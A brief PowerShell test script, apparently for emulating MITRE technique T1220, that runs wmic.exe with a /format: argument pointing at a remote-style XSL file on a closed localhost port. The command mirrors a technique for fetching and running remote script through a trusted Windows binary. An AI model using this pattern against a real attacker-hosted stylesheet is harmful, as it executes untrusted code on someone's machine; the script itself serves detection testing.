# Test for T1220 - wmic with a remote XSL on a closed local port (nothing is downloaded). Run in a lab/test VM only.
if (-not (Get-Command wmic.exe -ErrorAction SilentlyContinue)) { Write-Warning 'wmic.exe is not installed.'; return }
wmic.exe os get /format:http://127.0.0.1:1/T1220.xsl 2>$null
